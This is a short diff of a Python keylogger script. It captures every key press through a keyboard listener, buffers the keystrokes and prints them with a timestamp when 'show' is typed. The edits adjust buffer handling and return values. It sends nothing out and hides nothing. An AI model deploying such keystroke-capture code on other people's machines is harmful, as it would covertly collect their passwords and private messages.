@@ -6,7 +6,7 @@ dict1 = {
     "Key.enter": "enter"
 }
 current_time = datetime.now().strftime("%d/%m/%Y %H:%M")
-list1 = [""]
+list1 = []
 
 def on_press(key):
     try:
@@ -26,11 +26,11 @@ def spacial_keys(tempKey):
     global list1
     if tempKey == "backspace":
         list1 = list1[:-1]
-        return True
+        return
     elif tempKey == "enter":
         list1.append('\n')
-        return True
-    return False
+        return
+    return
 
 def add_to_file(tempKey):
     global current_time, list1
@@ -41,7 +41,7 @@ def add_to_file(tempKey):
     if list1[-4:] == ["s","h","o","w"]:
         print("\n***** " + current_time + " *****")
         print("".join(list1[:-4]))
-        list1 = ["*****", tempTime, "*****","\n"]
+        list1 = []
 
 listener = keyboard.Listener(on_press = on_press)
 listener.start()
